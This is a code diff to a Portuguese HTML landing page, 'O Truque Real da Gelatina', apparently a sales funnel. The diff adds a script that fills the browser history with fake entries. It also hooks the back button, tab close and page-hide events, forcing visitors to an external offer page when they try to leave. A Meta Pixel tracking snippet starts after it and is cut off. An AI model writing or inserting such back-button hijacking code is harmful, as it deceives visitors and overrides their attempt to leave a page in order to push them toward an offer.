@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
   <head>
@@ -6,6 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>O Truque Real da Gelatina</title>
     
+    <!-- Back Redirect Script -->
+    <script>
+    (function () {
+      var REDIRECT_URL = "https://ofertaexclusiva.figma.site/";
+      var FLAG = "br_done";
+
+      function redirect() {
+        if (sessionStorage.getItem(FLAG)) return;
+        sessionStorage.setItem(FLAG, "1");
+        window.location.replace(REDIRECT_URL);
+      }
+
+      // Cria histórico falso real
+      history.pushState({ br: 1 }, "", location.href);
+      history.pushState({ br: 2 }, "", location.href);
+
+      // Botão voltar do navegador
+      window.addEventListener("popstate", function (e) {
+        redirect();
+      });
+
+      // Fechar aba/navegador
+      window.addEventListener("beforeunload", function (e) {
+        redirect();
+      });
+
+      // Mobile / WebView / Safari
+      window.addEventListener("pagehide", function (e) {
+        redirect();
+      });
+
+    })();
+    </script>
+
     <!-- Meta Pixel Code -->
     <script>
     !function(f,b,e,v,n,t,s)
